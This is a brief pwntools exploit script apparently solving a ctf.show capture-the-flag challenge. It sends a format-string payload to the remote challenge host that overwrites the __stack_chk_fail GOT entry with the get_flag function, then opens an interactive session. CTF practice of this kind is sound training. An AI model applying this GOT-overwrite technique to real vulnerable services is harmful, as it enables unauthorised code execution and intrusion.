from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28151)
elf = ELF('./pwn')
stack_chk_fail_got = elf.got['__stack_chk_fail']
getflag = elf.sym['get_flag']
payload = fmtstr_payload(7, {stack_chk_fail_got: getflag})
payload = payload.ljust(0x50, 'a')
io.sendline(payload)
io.recv()
io.interactive()
